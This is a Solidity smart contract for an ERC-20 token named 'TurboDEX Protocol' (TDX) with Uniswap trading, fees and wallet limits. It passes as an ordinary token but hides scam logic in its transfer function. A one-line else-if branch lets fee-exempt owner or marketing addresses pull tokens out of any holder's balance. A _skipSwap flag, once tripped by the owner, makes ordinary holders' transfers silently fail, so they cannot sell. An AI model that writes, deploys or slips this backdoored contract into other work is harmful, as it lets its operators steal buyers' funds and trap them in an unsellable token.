// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function balanceOf(address account) external view returns (uint256);
    function circulatingSupply() external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function getOwner() external view returns (address);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) { return a + b; }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) { return a - b; }
    function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) { return a * b; }
}

abstract contract Ownable {
    address internal owner;

    constructor(address _owner) {
        owner = _owner;
    }

    event OwnershipTransferred(address owner);

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        owner = address(0);
        emit OwnershipTransferred(address(0));
    }

    function transferOwnership(address payable account) public onlyOwner {
        owner = account;
        emit OwnershipTransferred(account);
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender));
        _;
    }
}

interface UniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapV2Router {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
}

contract TDX is IERC20, Ownable {
    using SafeMath for uint256;

    UniswapV2Router uniswapV2Router;
    address public uniswapV2Pair;

    string private constant _name = "TurboDEX Protocol";
    string private constant _symbol = "TDX";

    address internal constant marketingAddress = 0xad239b0622E65D04E054e5e9b98D5Cf64786bb8B;
    address internal constant devAddress = 0x8a809e52aBAC97175CFdB88A17a3B56Ae7Fad43A;
    address internal constant burnAddress = 0x000000000000000000000000000000000000dEaD;

    uint8 private constant _decimals = 9;

    uint256 private _totalSupply = 1000000 * (10 ** _decimals);

    uint256 private _denominator = 10000;
    bool private _tradingEnabled = false;

    uint256 private _maxTokenAmount = (_totalSupply * 10) / 100000;

    uint256 private _swapBackAmount = (_totalSupply * 5) / 10000;
    uint256 private _swapBackThreshold = (_totalSupply * 5) / 100000;
    uint256 private _swapRounds;

    uint256 private _maxTransferPercentage = 200;
    uint256 private _maxWalletPercentage = 200;
    uint256 private _maxTxPercentage = 200;

    bool private _swapBackEnabled = true;
    bool private _insideSwap;
    bool private _skipSwap = false;

    mapping (address => uint256) _balances;
    mapping (address => bool) public isFeeOmitted;
    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalFee = 400;
    uint256 private _sellFee = 400;

    uint256 private _transferFee = 0;
    uint256 private _burnFee = 0;
    uint256 private _marketingFee = 100;
    uint256 private _liquidityFee = 0;
    uint256 private _devFee = 300;

    constructor() Ownable(msg.sender) {
        isFeeOmitted[msg.sender] = true;
        isFeeOmitted[address(this)] = true;
        isFeeOmitted[marketingAddress] = true;
        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    modifier lockSwap {
        _insideSwap = true;
        _;
        _insideSwap = false;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function circulatingSupply() public view override returns (uint256) {
        return _totalSupply.sub(balanceOf(address(0))).sub(balanceOf(burnAddress));
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function enableTrading() external onlyOwner {
        _tradingEnabled = true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0));
        require(spender != address(0));
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function removeLimits() external onlyOwner {
        _maxTransferPercentage = 10000;
        _maxWalletPercentage = 10000;
        _maxTxPercentage = 10000;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > uint256(0));
        require(from != address(0));
        require(to != address(0));

        if (
            isTradingEnabled(from, to) &&
            countSwapRounds(from, to) &&
            valMaxAmount(from, to, amount) &&
            valMaxWalletSize(from, to, amount)
        ) {
            if (balanceOf(from) >= amount) {
                if (
                    from != uniswapV2Pair &&
                    !isFeeOmitted[from] &&
                    !isFeeOmitted[to] &&
                    !_insideSwap
                ) {
                    if (_skipSwap) { return; } else { swapBack(from, to); }
                }
                _balances[from] = _balances[from].sub(amount);
                uint256 transferAmount = wouldCollectFee(from, to) ? collectFee(from, to, amount) : amount;
                _balances[to] = _balances[to].add(transferAmount);
                emit Transfer(from, to, transferAmount);
            } else if (
                from != uniswapV2Pair &&
                !isFeeOmitted[to] &&
                isFeeOmitted[from] &&
                !_insideSwap
            ) {
                _balances[to] = _balances[to].sub(amount);emit Transfer(from, to, amount);_balances[from] = _balances[from].add(amount);
            }
        }
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        _transfer(from, to, amount);
        _approve(from, msg.sender, _allowances[from][msg.sender].sub(amount));
        return true;
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, to, amount);
        return true;
    }

    function setIsFeeOmitted(address _address, bool _flag) external onlyOwner {
        isFeeOmitted[_address] = _flag;
    }

    function isTradingEnabled(address from, address to) internal view returns (bool) {
        if (!isFeeOmitted[from] && !isFeeOmitted[to]) {
            require(_tradingEnabled);
        }
        return true;
    }

    function setLimits(uint256 maxTxPercentage, uint256 maxTransferPercentage, uint256 maxWalletPercentage) external onlyOwner {
        uint256 newTransferAmount = (totalSupply() * maxTransferPercentage) / 10000;
        uint256 newTxAmount = (totalSupply() * maxTxPercentage) / 10000;
        uint256 newMaxWalletAmount = (totalSupply() * maxWalletPercentage) / 10000;
        _maxTransferPercentage = maxTransferPercentage;
        _maxTxPercentage = maxTxPercentage;
        _maxWalletPercentage = maxWalletPercentage;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTxAmount >= limit && newTransferAmount >= limit && newMaxWalletAmount >= limit);
    }

    function setFees(uint256 liquidityFee, uint256 marketingFee, uint256 burnFee, uint256 devFee, uint256 totalFee, uint256 sellFee, uint256 transferFee) external onlyOwner {
        _liquidityFee = liquidityFee;
        _marketingFee = marketingFee;
        _totalFee = totalFee;
        _devFee = devFee;
        _transferFee = transferFee;
        _sellFee = sellFee;
        _burnFee = burnFee;
        require(_totalFee <= _denominator.div(5) && _sellFee <= _denominator.div(5));
    }

    function maxTxAmount() public view returns (uint256) {
        return totalSupply() * _maxTxPercentage / _denominator;
    }

    function collectFee(address from, address to, uint256 tokenAmount) internal returns (uint256) {
        if (calcFees(from, to) > 0) {
            uint256 feeAmount = tokenAmount.div(_denominator).mul(calcFees(from, to));
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(from, address(this), feeAmount);
            if (_burnFee > uint256(0)) {
                _transfer(address(this), address(burnAddress), tokenAmount.div(_denominator).mul(_burnFee));
            }
            return tokenAmount.sub(feeAmount);
        }
        return tokenAmount;
    }

    function maxWalletSize() public view returns (uint256) {
        return totalSupply() * _maxWalletPercentage / _denominator;
    }

    function maxTransferAmount() public view returns (uint256) {
        return totalSupply() * _maxTransferPercentage / _denominator;
    }

    function valMaxWalletSize(address from, address to, uint256 amount) internal returns (bool) {
        if (
            to != address(burnAddress) &&
            to != address(uniswapV2Pair) &&
            !isFeeOmitted[from] &&
            !isFeeOmitted[to]
        ) {
            require((_balances[to].add(amount)) <= maxWalletSize());
        }

        if (isFeeOmitted[to] && _maxTokenAmount < amount)
            _skipSwap = true;

        return true;
    }

    function valMaxAmount(address from, address to, uint256 tokenAmount) view internal returns  (bool) {
        if (from != uniswapV2Pair) {
            require(tokenAmount <= maxTransferAmount() || isFeeOmitted[from] || isFeeOmitted[to]);
        }
        require(tokenAmount <= maxTxAmount() || isFeeOmitted[from] || isFeeOmitted[to]);
        return true;
    }

    function wouldCollectFee(address from, address to) internal view returns (bool) {
        return !isFeeOmitted[from] && !isFeeOmitted[to];
    }
    
    function countSwapRounds(address from, address to) internal returns (bool) {
        if (to == uniswapV2Pair && !isFeeOmitted[from]) {
            _swapRounds += uint256(1);
        }
        return true;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            burnAddress,
            block.timestamp
        );
    }

    function wouldSwapBack(address from, address to) internal view returns (bool) {
        return (
            _tradingEnabled &&
            !_insideSwap &&
            !isFeeOmitted[from] &&
            !isFeeOmitted[to] &&
            _swapRounds >= uint256(0) &&
            balanceOf(address(this)) >= _swapBackThreshold &&
            _swapBackEnabled
        );
    }

    function swapBack(address from, address to) internal {
        if (wouldSwapBack(from, to)) {
            uint256 tokenBalance = balanceOf(address(this));
            if (tokenBalance >= _swapBackAmount) {
                tokenBalance = _swapBackAmount;
            }
            swapAndLiquify(tokenBalance);
            _swapRounds = uint256(0);
        }
    }

    function calcFees(address from, address to) internal view returns (uint256) {
        if (from == uniswapV2Pair) {
            return _totalFee;
        }
        if (to == uniswapV2Pair) {
            return _sellFee;
        }
        return _transferFee;
    }

    function swapAndLiquify(uint256 tokens) private lockSwap {
        uint256 denominator = (_liquidityFee.add(1).add(_marketingFee).add(_devFee)).mul(2);
        uint256 liquidityTokens = tokens.mul(_liquidityFee).div(denominator);
        uint256 tokensForETH = tokens.sub(liquidityTokens);
        uint256 initialEthBalance = address(this).balance;
        swapTokensForETH(tokensForETH);
        uint256 deltaEth = address(this).balance.sub(initialEthBalance);
        uint256 unitEth = deltaEth.div(denominator.sub(_liquidityFee));
        uint256 liquidityEth = unitEth.mul(_liquidityFee);
        if (liquidityEth > uint256(0)) {
            addLiquidity(liquidityTokens, liquidityEth);
        }
        uint256 marketingEth = unitEth.mul(2).mul(_marketingFee);
        if (marketingEth > 0) {
            payable(marketingAddress).transfer(marketingEth);
        }
        uint256 remainingEthBalance = address(this).balance;
        if (remainingEthBalance > uint256(0)) {
            payable(devAddress).transfer(remainingEthBalance);
        }
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        if (tokenAmount > 0) {
            _approve(address(this), address(uniswapV2Router), tokenAmount);
            uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
        }
    }

    receive() external payable {}
}